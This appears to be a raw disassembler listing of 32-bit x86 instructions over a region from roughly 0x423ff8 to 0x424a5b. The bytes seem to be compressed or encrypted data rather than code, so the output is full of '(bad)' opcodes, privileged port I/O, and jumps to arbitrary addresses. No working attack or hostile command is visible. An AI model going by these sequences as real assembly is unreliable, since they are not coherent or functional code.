  423ff8:	mov    dl,0xd0
  423ffa:	sub    BYTE PTR [edx],bh
  423ffc:	mov    edi,0xd68db693
  424001:	pop    edi
  424002:	mov    ebx,0x8ff0608d
  424007:	pushf  
  424008:	in     al,dx
  424009:	stos   DWORD PTR es:[edi],eax
  42400a:	adc    dh,BYTE PTR [edx+edi*4-0x27]
  42400e:	mov    ds:0xe6739644,al
  424013:	adc    DWORD PTR [eax-0x1148e8f6],ebx
  424019:	imul   esp,DWORD PTR [edi],0xfffffff3
  42401c:	outs   dx,DWORD PTR ds:[esi]
  42401d:	stos   DWORD PTR es:[edi],eax
  42401e:	stos   DWORD PTR es:[edi],eax
  42401f:	sti    
  424020:	xor    BYTE PTR [ecx+0x3a],bl
  424023:	mov    esi,ebx
  424025:	ss je  0x423fb5
  424028:	sbb    ebx,DWORD PTR [edx]
  42402a:	in     eax,0xf9
  42402c:	xchg   edx,eax
  42402d:	call   0x1232:0xfd2ec1b1
  424034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424035:	pop    ds
  424036:	mov    ebx,0x28572954
  42403b:	int    0x42
  42403d:	ret    0x534f
  424040:	imul   ebp,DWORD PTR [esi+esi*4+0x31],0x7b
  424045:	lods   al,BYTE PTR ds:[si]
  424047:	push   ebp
  424048:	jmp    0x423ffa
  42404a:	adc    bl,0xf8
  42404d:	jno    0x424066
  42404f:	(bad)  
  424050:	dec    edi
  424051:	lea    edx,[esi+esi*8]
  424054:	loopne 0x424004
  424056:	mov    dl,0x4e
  424058:	rcr    DWORD PTR [eax],1
  42405a:	repz mov WORD PTR [ecx+ebx*4+0x77776b60],es
  424062:	popf   
  424063:	cmc    
  424064:	mov    edi,0x8ffe46f2
  424069:	pop    esp
  42406a:	(bad)  
  42406b:	and    eax,0x35eef4af
  424070:	es push ecx
  424072:	cmp    dh,cl
  424074:	cld    
  424075:	arpl   WORD PTR [ecx+edx*4+0x4bf90474],bp
  42407c:	out    0xcd,al
  42407e:	or     ebp,0xb26081f0
  424084:	adc    BYTE PTR [edx],bh
  424086:	ins    DWORD PTR es:[edi],dx
  424087:	dec    ebp
  424088:	int3   
  424089:	adc    al,0xa1
  42408b:	xchg   esp,eax
  42408c:	push   0xffffffa5
  42408e:	popf   
  42408f:	and    BYTE PTR [ebx],cl
  424091:	push   ss
  424092:	cmp    ebx,DWORD PTR [esi+esi*4]
  424095:	and    bl,BYTE PTR [ebp-0x2a2ce50]
  42409b:	jns    0x4240e1
  42409d:	retf   
  42409e:	jl     0x42408c
  4240a0:	jno    0x424076
  4240a2:	inc    ebx
  4240a3:	mov    esp,0xdc82836b
  4240a8:	das    
  4240a9:	inc    esp
  4240aa:	mov    al,ds:0xfa93c9b8
  4240af:	dec    edx
  4240b0:	in     al,dx
  4240b1:	push   ss
  4240b2:	add    al,0xc2
  4240b4:	int3   
  4240b5:	jmp    FWORD PTR [ebx*2-0x4677f807]
  4240bc:	or     BYTE PTR [eax+0x5c189d14],0x56
  4240c3:	aas    
  4240c4:	push   0x1b
  4240c6:	mov    esp,0x6d1583b0
  4240cb:	mov    BYTE PTR [ebp+0x6f],dl
  4240ce:	adc    edi,DWORD PTR [edx+eax*4+0x2e]
  4240d2:	pop    esp
  4240d3:	je     0x4240e9
  4240d5:	pop    ebx
  4240d6:	out    0xa4,al
  4240d8:	test   BYTE PTR [ebx+ecx*2+0x4c6c5636],dh
  4240df:	push   cs
  4240e0:	repnz adc ebp,DWORD PTR [ebp+0x1a]
  4240e4:	es jae 0x4240bc
  4240e7:	cmp    BYTE PTR [ecx-0x5b],dh
  4240ea:	inc    eax
  4240eb:	sbb    DWORD PTR [esi+0xa],esi
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	or     ch,BYTE PTR [edi-0x7c981e19]
  424168:	add    DWORD PTR [eax],eax
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	aaa    
  42416f:	mov    ebx,0x3c4c8da9
  424174:	mov    ch,0xaa
  424176:	add    BYTE PTR [esi-0x5d2c323e],dl
  42417c:	sub    eax,0xb3b955a2
  424181:	jb     0x42418e
  424183:	xchg   edx,eax
  424184:	sub    ah,ah
  424186:	dec    edx
  424187:	cwde   
  424188:	sub    esp,ebp
  42418a:	mov    ebp,0x49c9580
  42418f:	pop    esi
  424190:	pop    ecx
  424191:	retf   
  424192:	inc    esi
  424193:	test   BYTE PTR [edi-0x7a],0xe2
  424197:	cmp    al,0x8d
  424199:	stos   DWORD PTR es:[edi],eax
  42419a:	add    eax,0xd6a72558
  42419f:	loop   0x424138
  4241a1:	mov    al,ds:0x911ad4d4
  4241a6:	fwait
  4241a7:	xor    dh,BYTE PTR [ebx]
  4241a9:	xor    ch,BYTE PTR [ecx]
  4241ab:	mov    bl,0x49
  4241ad:	add    al,bh
  4241af:	or     bh,BYTE PTR [ebx+0x2072e0c3]
  4241b5:	xchg   edi,eax
  4241b6:	(bad)  
  4241b7:	jmp    0x9a4fd18c
  4241bc:	ret    
  4241bd:	test   DWORD PTR [ecx+0x7fab3d72],esp
  4241c3:	cmc    
  4241c4:	test   DWORD PTR [edx+0x58],edx
  4241c7:	rcl    DWORD PTR [edi-0x3a784f6e],cl
  4241cd:	lock in al,dx
  4241cf:	int    0x52
  4241d1:	retf   
  4241d2:	fnstenv [eax+0x75271e1c]
  4241d8:	sub    eax,0x4d
  4241db:	jmp    0x64baf734
  4241e0:	dec    esi
  4241e1:	shr    DWORD PTR [ecx-0x15],0x40
  4241e5:	scas   eax,DWORD PTR es:[edi]
  4241e6:	loopne 0x42416a
  4241e8:	push   ebp
  4241e9:	xor    ch,BYTE PTR [ebx-0x7f]
  4241ec:	cmp    al,0x87
  4241ee:	inc    ebp
  4241ef:	(bad)  
  4241f0:	(bad)  
  4241f1:	clc    
  4241f2:	sbb    edx,ecx
  4241f4:	popa   
  4241f5:	inc    ebp
  4241f6:	sbb    dh,dh
  4241f8:	repz shr DWORD PTR [ebx+ebx*2+0x6c2de3bc],0x63
  424201:	imul   ecx,edi,0x5d
  424204:	rcl    BYTE PTR [ecx-0x69],0xd1
  424208:	pusha  
  424209:	outs   dx,BYTE PTR ds:[esi]
  42420a:	sub    BYTE PTR [esi-0x41d0d9e1],al
  424210:	out    0xe4,al
  424212:	push   esp
  424213:	or     ebx,ecx
  424215:	repnz es add eax,0x15dfa1c1
  42421c:	pop    ss
  42421d:	nop
  42421e:	cmp    eax,DWORD PTR [ebx+0x1f9fe83d]
  424224:	mov    al,BYTE PTR [edx+edx*2-0x2f]
  424228:	inc    ebp
  424229:	cmp    bl,al
  42422b:	mov    ecx,0x4d4fc598
  424230:	jmp    0x922a:0xf672c123
  424237:	push   cs
  424238:	or     ch,BYTE PTR [esi-0x632c7115]
  42423e:	imul   esi,DWORD PTR [edi+ecx*8],0x1f
  424242:	push   es
  424243:	mov    DWORD PTR [ebp+0x34],eax
  424246:	lock sti 
  424248:	push   ecx
  424249:	arpl   WORD PTR [ecx],cx
  42424b:	loope  0x4241e1
  42424d:	jmp    0x42423b
  42424f:	aad    0xfe
  424251:	mov    ebp,0xb0af917d
  424256:	pop    esi
  424257:	sbb    al,0xc7
  424259:	push   ebp
  42425a:	push   eax
  42425b:	pop    ds
  42425c:	adc    ebx,DWORD PTR [ebx]
  42425e:	xchg   esi,eax
  42425f:	pop    esi
  424260:	cmp    DWORD PTR [ebx],ecx
  424262:	into   
  424263:	imul   ecx,DWORD PTR [eax],0x7b451f14
  424269:	fcom   DWORD PTR [ebx]
  42426b:	cmp    edx,DWORD PTR es:[esi+0x0]
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	fld    TBYTE PTR [eax-0x7b98c1ae]
  4242e8:	add    DWORD PTR [eax],eax
  4242ea:	add    BYTE PTR [ecx],al
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	into   
  4242ef:	enter  0xca8d,0xfe
  4242f3:	ror    DWORD PTR [eax],1
  4242f5:	(bad)  
  4242f6:	popa   
  4242f7:	aaa    
  4242f8:	rol    DWORD PTR [ebx+0x273f63f9],1
  4242fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242ff:	es js  0x4242ec
  424302:	sbb    eax,0xae02e475
  424307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424308:	cli    
  424309:	xor    BYTE PTR [ecx],ch
  42430b:	fs pop ebx
  42430d:	sar    esp,0x32
  424310:	lea    ebx,[ebx]
  424312:	jge    0x424344
  424314:	dec    edi
  424315:	mov    ebp,0x752ce573
  42431a:	icebp  
  42431b:	mov    ds:0x764e85c7,al
  424320:	xchg   esp,eax
  424321:	jnp    0x4242f4
  424323:	inc    ebp
  424324:	jp     0x4242f2
  424326:	inc    ecx
  424327:	out    dx,eax
  424328:	mov    BYTE PTR [ecx+0x79],dl
  42432b:	fdivr  QWORD PTR ds:0xfc09c828
  424331:	scas   eax,DWORD PTR es:[edi]
  424332:	int3   
  424333:	push   ss
  424334:	sub    eax,0x455fb834
  424339:	fwait
  42433a:	sti    
  42433b:	or     eax,0xa9641f7c
  424340:	hlt    
  424341:	jb     0x42435b
  424343:	pop    ds
  424344:	jnp    0x4243a9
  424346:	inc    eax
  424347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424348:	sbb    DWORD PTR [esi],esp
  42434a:	sub    di,dx
  42434d:	outs   dx,DWORD PTR ds:[esi]
  42434e:	ins    DWORD PTR es:[edi],dx
  42434f:	dec    DWORD PTR [edx-0x7a]
  424352:	mov    es:0x3b62eb7c,al
  424358:	fs loope 0x42430d
  42435b:	adc    ecx,DWORD PTR [ecx]
  42435d:	cmp    eax,0xa70b396a
  424362:	sahf   
  424363:	xchg   ecx,eax
  424364:	cmp    eax,0x1b3d5a8c
  424369:	pop    ecx
  42436a:	jbe    0x42433e
  42436c:	sub    al,0x95
  42436e:	push   ebx
  42436f:	fsub   QWORD PTR [ebx+eax*8]
  424372:	push   ecx
  424373:	sub    eax,0xfc4c14e9
  424378:	xchg   edx,eax
  424379:	div    DWORD PTR [ebx+0x72]
  42437c:	arpl   WORD PTR [ebx+0x76f73c7f],cx
  424382:	mov    edi,0x90c53c5
  424387:	mov    eax,ds:0x8f413bea
  42438c:	push   eax
  42438d:	rcr    ecx,0x54
  424390:	lahf   
  424391:	imul   eax,DWORD PTR [eax],0xffffff84
  424394:	xchg   ebx,eax
  424395:	pusha  
  424396:	retf   0xb5de
  424399:	mov    sp,0x6f0d
  42439d:	mov    ebp,eax
  42439f:	xlat   BYTE PTR ds:[ebx]
  4243a0:	out    0x74,al
  4243a2:	sbb    eax,0x6d8e31d3
  4243a7:	push   es
  4243a8:	std    
  4243a9:	mov    edi,0xa7d2bf69
  4243ae:	outs   dx,DWORD PTR ds:[esi]
  4243af:	out    0xd9,eax
  4243b1:	dec    esi
  4243b2:	repz je 0x4243d4
  4243b5:	inc    edi
  4243b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243b7:	fild   WORD PTR [esi]
  4243b9:	cmp    DWORD PTR [eax+0x2c41f713],ebp
  4243bf:	out    dx,eax
  4243c0:	push   ss
  4243c1:	pop    esp
  4243c2:	retf   
  4243c3:	in     al,dx
  4243c4:	mov    ah,0x5f
  4243c6:	cmp    eax,DWORD PTR [edi-0x7a]
  4243c9:	popa   
  4243ca:	stc    
  4243cb:	sub    dl,al
  4243cd:	repnz (bad) 
  4243cf:	(bad)  
  4243d0:	push   ecx
  4243d1:	cmc    
  4243d2:	cld    
  4243d3:	adc    esi,DWORD PTR [edi-0x52]
  4243d6:	jg     0x42443f
  4243d8:	scas   al,BYTE PTR es:[edi]
  4243d9:	push   ebp
  4243da:	dec    ebx
  4243db:	cmp    al,0x24
  4243dd:	mov    eax,ds:0x1a4bc3e2
  4243e2:	ds sbb al,0xba
  4243e5:	out    dx,al
  4243e6:	bnd jmp 0x3cdc34b9
  4243ec:	(bad)  
  4243ed:	std    
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424464
  424463:	mov    eax,edi
  424465:	mov    dh,0x67
  424467:	test   DWORD PTR [ecx],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [eax-0x6c],bl
  424470:	xor    BYTE PTR [ecx],0x4f
  424473:	loope  0x424446
  424475:	push   ebx
  424476:	pusha  
  424477:	mov    BYTE PTR [eax-0x5e],0x89
  42447b:	call   DWORD PTR [edi+0x3c]
  42447e:	dec    eax
  42447f:	inc    ebx
  424480:	adc    eax,0xaedada46
  424485:	cmp    eax,0xfae8fe36
  42448a:	dec    ecx
  42448b:	jb     0x42444c
  42448d:	and    DWORD PTR [edx+0x12],edx
  424490:	in     al,0x86
  424492:	int    0xc6
  424494:	xchg   esp,ebp
  424496:	sub    edx,edi
  424498:	add    eax,0x5700947b
  42449d:	les    eax,FWORD PTR [edi+eax*1-0x5889bd6e]
  4244a4:	cmp    eax,0xff604e1c
  4244a9:	and    DWORD PTR [ecx-0x2e7448cc],esi
  4244af:	sub    edi,DWORD PTR [ebx]
  4244b1:	pop    ebp
  4244b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b3:	popf   
  4244b4:	ins    WORD PTR es:[edi],dx
  4244b6:	rol    BYTE PTR [edx+0x77],cl
  4244b9:	jno    0x424532
  4244bb:	xchg   esp,eax
  4244bc:	outs   dx,BYTE PTR ds:[esi]
  4244bd:	fadd   QWORD PTR [ebp+0x7f]
  4244c0:	sub    BYTE PTR [ebx+0x5c841650],al
  4244c6:	cdq    
  4244c7:	dec    edx
  4244c8:	pop    edi
  4244c9:	mov    DWORD PTR [ecx+0x4c],eax
  4244cc:	mov    edx,0x8eaef254
  4244d1:	push   edx
  4244d2:	(bad)  
  4244d3:	cdq    
  4244d4:	adc    al,0xdd
  4244d6:	xchg   esi,eax
  4244d7:	mov    dl,0x71
  4244d9:	inc    esi
  4244da:	fwait
  4244db:	imul   eax,DWORD PTR ds:0x1731fad9,0xcf1b73f3
  4244e5:	cli    
  4244e6:	xchg   edx,eax
  4244e7:	dec    eax
  4244e8:	retf   
  4244e9:	imul   ebp,DWORD PTR [edi],0x9d3aedc8
  4244ef:	cmc    
  4244f0:	fs sti 
  4244f2:	jecxz  0x424556
  4244f4:	mov    ds,WORD PTR ds:0x8831809b
  4244fa:	clc    
  4244fb:	sbb    cl,BYTE PTR [edi+eiz*8]
  4244fe:	into   
  4244ff:	outs   dx,BYTE PTR ds:[esi]
  424500:	cli    
  424501:	dec    ecx
  424502:	outs   dx,DWORD PTR ds:[esi]
  424503:	ror    BYTE PTR [ecx-0x13f636c],1
  424509:	mov    ch,0x63
  42450b:	shl    ecx,0x3a
  42450e:	loop   0x4244fd
  424510:	ins    BYTE PTR es:[edi],dx
  424511:	inc    eax
  424512:	mov    dh,0x97
  424514:	mov    bh,0xb3
  424516:	gs pop esp
  424518:	or     ebx,DWORD PTR [edi-0x7c]
  42451b:	pop    es
  42451c:	aam    0x8c
  42451e:	jo     0x4244b0
  424520:	sub    esp,DWORD PTR gs:[ebx-0x5608f815]
  424527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424528:	fmul   DWORD PTR [edx]
  42452a:	sbb    DWORD PTR [eax],esi
  42452c:	dec    ecx
  42452d:	pop    ss
  42452e:	outs   dx,BYTE PTR ds:[esi]
  42452f:	das    
  424530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424531:	dec    edx
  424532:	or     DWORD PTR [esi+0x280af374],ebx
  424538:	lods   eax,DWORD PTR ds:[esi]
  424539:	inc    eax
  42453a:	push   ecx
  42453b:	inc    ebx
  42453c:	sahf   
  42453d:	push   edi
  42453e:	xchg   BYTE PTR [eax-0x5a],al
  424541:	push   ecx
  424542:	gs int 0x3f
  424545:	add    eax,DWORD PTR [eax+ebx*2-0x4]
  424549:	mov    eax,0x5f6cf42b
  42454e:	mov    dl,0x4e
  424550:	aam    0xc
  424552:	add    BYTE PTR [ecx-0x20],bh
  424555:	(bad)
  424558:	test   al,0xd8
  42455a:	add    eax,0x3d82aae3
  42455f:	int3   
  424560:	cmp    eax,0x2daf7734
  424565:	or     eax,0x1e4187ca
  42456a:	test   BYTE PTR [esi+0x6bc9],0x0
	...
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x76],1
  4245e3:	jne    0x424646
  4245e5:	jp     0x42464e
  4245e7:	xchg   BYTE PTR [ecx],al
  4245e9:	add    BYTE PTR [eax],al
  4245eb:	add    DWORD PTR [eax],eax
  4245ed:	add    BYTE PTR [ebp+0x1b49c43],dl
  4245f3:	push   cs
  4245f4:	aad    0xf8
  4245f6:	pop    ebp
  4245f7:	inc    esp
  4245f8:	add    BYTE PTR [ebp-0x56],0xe
  4245fc:	dec    BYTE PTR [esp+edi*1-0xcb289c1]
  424603:	push   0x27
  424605:	inc    esi
  424606:	int    0x41
  424608:	push   ebx
  424609:	loopne 0x42465e
  42460b:	dec    edx
  42460c:	pop    ds
  42460d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42460e:	shl    ch,cl
  424610:	or     edx,DWORD PTR [ebx]
  424612:	call   0xfbcbef5f
  424617:	mov    edi,0xbaae991
  42461c:	lahf   
  42461d:	stos   DWORD PTR es:[edi],eax
  42461e:	js     0x42461d
  424620:	jno    0x424682
  424622:	inc    ecx
  424623:	ds mov edi,?
  424626:	sub    edi,DWORD PTR [ecx-0x45]
  424629:	(bad)  
  42462a:	xsaves [eax]
  42462d:	and    BYTE PTR [edi-0x1ad969d1],bh
  424633:	jecxz  0x4245f1
  424635:	pushf  
  424636:	pop    esi
  424637:	(bad)  
  424638:	in     eax,dx
  424639:	stos   BYTE PTR es:[edi],al
  42463a:	enter  0xe282,0x0
  42463e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42463f:	scas   eax,DWORD PTR es:[edi]
  424640:	jle    0x424687
  424642:	xor    al,0x4
  424644:	(bad)  
  424645:	retf   
  424646:	pushf  
  424647:	iret   
  424648:	inc    ebx
  424649:	imul   ebx,DWORD PTR [esi],0x5530c90e
  42464f:	xchg   BYTE PTR [ebx+0x7598847e],ah
  424655:	cmp    DWORD PTR [ebx+ebx*1],ecx
  424658:	dec    ebx
  424659:	mov    edi,0xe720ad45
  42465e:	dec    eax
  42465f:	sbb    ch,ah
  424661:	hlt    
  424662:	adc    DWORD PTR [esi+0xa9ba37a],esi
  424668:	sub    eax,0x8f4fe647
  42466d:	int3   
  42466e:	jno    0x4245f4
  424670:	pusha  
  424671:	jp     0x424694
  424673:	and    DWORD PTR [ebx],ebp
  424675:	add    BYTE PTR [edx+eax*8],bh
  424678:	scas   eax,DWORD PTR es:[edi]
  424679:	mov    al,0x6d
  42467b:	rol    BYTE PTR [ebx],0xb7
  42467e:	xchg   ecx,eax
  42467f:	aaa    
  424680:	mov    es,WORD PTR [eax-0x328cffd7]
  424686:	push   eax
  424687:	mov    eax,0xbd8e640
  42468c:	aad    0xf2
  42468e:	jmp    0x7f73:0xa6076a1b
  424695:	push   0x36
  424697:	adc    eax,ebx
  424699:	bswap  esp
  42469b:	pop    esp
  42469c:	sub    edx,esp
  42469e:	mov    ?,WORD PTR [edx]
  4246a0:	dec    ebx
  4246a1:	and    BYTE PTR [edi+edi*8-0x28f0b042],dl
  4246a8:	addr16 adc al,0x11
  4246ab:	add    esi,DWORD PTR [ebp+eiz*2-0xa]
  4246af:	cmp    BYTE PTR [ecx+0x13],0x50
  4246b3:	out    dx,al
  4246b4:	mov    al,ds:0xfb5054e6
  4246b9:	pop    es
  4246ba:	mov    esi,0xff7927aa
  4246bf:	mov    bl,0x59
  4246c1:	das    
  4246c2:	test   eax,0x1aa1b017
  4246c7:	(bad)
  4246cb:	lea    esp,[edi+0x24]
  4246ce:	xor    BYTE PTR [eax],0x75
  4246d1:	xor    BYTE PTR [esi+ecx*2],bh
  4246d4:	add    ecx,ebp
  4246d6:	lock frstor [edx+0x1e]
  4246da:	mov    ds,esp
  4246dc:	xchg   ebx,eax
  4246dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246de:	cmp    edx,esp
  4246e0:	das    
  4246e1:	mov    cl,0x44
  4246e3:	sbb    DWORD PTR [edx],ebx
  4246e5:	pop    eax
  4246e6:	mov    BYTE PTR [ebx+0x4b5a67ec],bl
  4246ec:	out    0xdb,eax
	...
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [ecx],ah
  424763:	popa   
  424764:	in     al,0x8d
  424766:	xchg   DWORD PTR [bx+di],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    bl,dl
  42476f:	idiv   DWORD PTR [esi-0xd311706]
  424775:	xor    BYTE PTR [ecx+0x2c],bl
  424778:	pop    esi
  424779:	fisttp DWORD PTR [eax-0x70]
  42477c:	jg     0x424728
  42477e:	int    0x71
  424780:	lahf   
  424781:	push   0xffffffcc
  424783:	popa   
  424784:	mov    bl,0x77
  424786:	adc    al,0x30
  424788:	(bad)  
  424789:	(bad)  
  42478b:	mov    ds:0x9356ad57,eax
  424790:	cmc    
  424791:	push   ss
  424792:	iret   
  424793:	je     0x424802
  424795:	jp     0x424745
  424797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424798:	xlat   BYTE PTR ds:[ebx]
  424799:	lods   al,BYTE PTR ds:[esi]
  42479a:	dec    ebp
  42479b:	scas   eax,DWORD PTR es:[edi]
  42479c:	sar    eax,0x7f
  42479f:	pop    ebp
  4247a0:	jne    0x4247f7
  4247a2:	fild   QWORD PTR [ecx-0xf]
  4247a5:	js     0x42473a
  4247a7:	arpl   WORD PTR [edi+0x2064e043],bx
  4247ad:	xor    BYTE PTR [edx-0x7d1bc3b1],ch
  4247b3:	outs   dx,DWORD PTR ds:[esi]
  4247b4:	(bad)  
  4247b5:	arpl   WORD PTR [ebp+0x6c],dx
  4247b8:	mov    cl,0x68
  4247ba:	in     al,dx
  4247bb:	pop    ebx
  4247bc:	pop    ecx
  4247bd:	addr16 in al,0x68
  4247c0:	xchg   ebp,eax
  4247c1:	dec    ecx
  4247c2:	(bad)  
  4247c3:	(bad)  [edx-0x17]
  4247c6:	add    BYTE PTR [ebx+0x246d3122],cl
  4247cc:	push   ebx
  4247cd:	sub    BYTE PTR [ebp+0x9],ch
  4247d0:	xchg   ebp,eax
  4247d1:	sti    
  4247d2:	mov    ds:0xf5dbfe46,al
  4247d7:	jne    0x42482c
  4247d9:	jmp    0x412067cc
  4247de:	mov    al,0x94
  4247e0:	(bad)  
  4247e1:	pop    DWORD PTR [esi-0x2f53b593]
  4247e7:	inc    ecx
  4247e8:	xor    edx,0xffffff83
  4247eb:	lea    eax,[ecx]
  4247ed:	or     bl,BYTE PTR [esp+edi*2-0x5d]
  4247f1:	aad    0x7
  4247f3:	jb     0x42483d
  4247f5:	(bad)  
  4247f7:	icebp  
  4247f8:	popf   
  4247f9:	bound  ebp,QWORD PTR [esi]
  4247fb:	and    eax,DWORD PTR [edi-0x6e]
  4247fe:	cmp    ch,BYTE PTR [edx+0xa]
  424801:	mov    cl,0x4c
  424803:	test   cl,cl
  424805:	jmp    0xe14235e1
  42480a:	or     BYTE PTR [eax],ah
  42480c:	jns    0x424839
  42480e:	mov    edi,0x15cf3023
  424813:	neg    BYTE PTR [eax-0x10]
  424816:	int3   
  424817:	xchg   DWORD PTR [esi+ebp*1-0x177aa92b],edx
  42481e:	shr    dh,0xc5
  424821:	call   0xa9b9:0xde83ac72
  424828:	jmp    DWORD PTR [edi-0x66]
  42482b:	daa    
  42482c:	es or  esi,esp
  42482f:	and    eax,0x643229bf
  424834:	add    edi,DWORD PTR [edi+ebp*8]
  424837:	cmp    DWORD PTR ds:0x1286f07a,ebx
  42483d:	inc    edi
  42483e:	xor    dl,BYTE PTR [eax-0x78]
  424841:	sbb    BYTE PTR [ebx-0x56],bh
  424844:	pop    ss
  424845:	popf   
  424846:	pop    edx
  424847:	push   es
  424848:	outs   dx,DWORD PTR ds:[esi]
  424849:	ja     0x42487a
  42484b:	inc    edx
  42484c:	and    edx,ebx
  42484e:	mov    dl,0xa2
  424850:	xor    BYTE PTR [eax+0x7b],bh
  424853:	scas   eax,DWORD PTR es:[edi]
  424854:	outs   dx,DWORD PTR ds:[esi]
  424855:	xor    edi,DWORD PTR [edi-0x7b1b056e]
  42485b:	xor    al,0xb5
  42485d:	ss (bad) 
  42485f:	retf   0x27b2
  424862:	ret    0x7181
  424865:	dec    ebp
  424866:	dec    ecx
  424867:	jno    0x424891
  424869:	and    dh,BYTE PTR [esi+0xf52a77]
	...
  4248d3:	add    BYTE PTR [eax],al
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	jno    0x424874
  4248e4:	push   ebx
  4248e5:	mul    BYTE PTR [edi-0x78]
  4248e8:	add    DWORD PTR [eax],eax
  4248ea:	add    BYTE PTR [ecx],al
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	sbb    DWORD PTR ds:0x29fd6001,0xffffff98
  4248f5:	mov    dl,0xc5
  4248f7:	cld    
  4248f8:	pop    esp
  4248f9:	(bad)  
  4248fa:	xchg   esp,eax
  4248fb:	pop    eax
  4248fc:	jns    0x424930
  4248fe:	jo     0x4248af
  424900:	fild   QWORD PTR [esi]
  424902:	ds cmp eax,0xa05e5c92
  424908:	xor    eax,DWORD PTR [ecx]
  42490a:	xlat   BYTE PTR ds:[ebx]
  42490b:	mov    ebx,0xad4cba22
  424910:	dec    esp
  424911:	inc    ecx
  424912:	mov    cl,0x14
  424914:	dec    ebx
  424915:	xchg   edx,eax
  424916:	cmp    dl,BYTE PTR [ebx+0x32]
  424919:	jbe    0x424908
  42491b:	test   BYTE PTR [ecx],bh
  42491d:	add    ebp,DWORD PTR [eax-0x6a]
  424920:	repz add ah,ch
  424923:	sbb    DWORD PTR [esi],ebp
  424925:	in     eax,0xf1
  424927:	fisttp DWORD PTR [ebx]
  424929:	lock lea eax,[edi]
  42492c:	loop   0x4248e6
  42492e:	retf   0xbc63
  424931:	cs pop ebx
  424933:	mov    al,ds:0xcf7af656
  424938:	lods   al,BYTE PTR ds:[esi]
  424939:	ja     0x424928
  42493b:	mov    ss,edi
  42493d:	add    DWORD PTR [ecx],edi
  42493f:	adc    dl,BYTE PTR [edi]
  424941:	push   esp
  424942:	loop   0x424985
  424944:	dec    ecx
  424945:	repnz test bl,al
  424948:	(bad)  
  424949:	push   0x92cadd11
  42494e:	inc    ecx
  42494f:	adc    ebx,ecx
  424951:	jno    0x424996
  424953:	lods   al,BYTE PTR fs:[esi]
  424955:	mov    es,WORD PTR ds:0xaa4d4168
  42495b:	addr16 ds (bad) 
  42495e:	xor    DWORD PTR [eax],ebp
  424960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424961:	and    eax,0xa40d870a
  424966:	(bad)  
  424968:	int3   
  424969:	das    
  42496a:	mov    dh,0x3d
  42496c:	sub    al,BYTE PTR [edi-0x11da96e6]
  424972:	gs or  ebp,ebx
  424975:	pop    edi
  424976:	mov    eax,0x7cd0fad6
  42497b:	call   0xde25:0xa679a918
  424982:	stc    
  424983:	pop    edx
  424984:	lods   eax,DWORD PTR ds:[esi]
  424985:	pmuludq mm0,QWORD PTR [ecx+0x1a9da2da]
  42498c:	rol    DWORD PTR [esi],1
  42498e:	fist   WORD PTR [eax+ebx*2+0x37a81cd1]
  424995:	test   eax,0xad733bb8
  42499a:	stos   BYTE PTR es:[edi],al
  42499b:	mov    gs,edx
  42499d:	mov    dl,0x94
  42499f:	xchg   edx,eax
  4249a0:	dec    ebx
  4249a1:	lock pop esp
  4249a4:	int3   
  4249a5:	test   ah,0x8d
  4249a8:	cmc    
  4249a9:	xor    eax,0x5b3f83e
  4249ae:	sbb    eax,0x7f107e26
  4249b3:	inc    ecx
  4249b4:	sbb    al,0xed
  4249b6:	in     eax,0x3b
  4249b8:	inc    edx
  4249b9:	(bad)  
  4249ba:	and    eax,ebp
  4249bc:	xchg   esi,eax
  4249bd:	inc    ebp
  4249be:	mov    ebx,0x3e3eb2f9
  4249c3:	sbb    edx,DWORD PTR [ecx-0x7b9710b0]
  4249c9:	dec    ebp
  4249ca:	cmp    DWORD PTR [ebp+edi*8+0x493dc0fa],ecx
  4249d1:	fdiv   st(4),st
  4249d3:	add    bl,BYTE PTR [eax-0x73a44928]
  4249d9:	mov    edx,0x322b9311
  4249de:	mov    eax,0x47d07ad5
  4249e3:	pusha  
  4249e4:	ret    
  4249e5:	data16 lods al,BYTE PTR ds:[esi]
  4249e7:	mov    esp,0xcf30ddd6
  4249ec:	jmp    0x424a95
	...
  424a55:	add    BYTE PTR [ebx+0x18],ch
  424a58:	arpl   WORD PTR [edx+0x73],bp
  424a5b:	jnp    0x424ac8
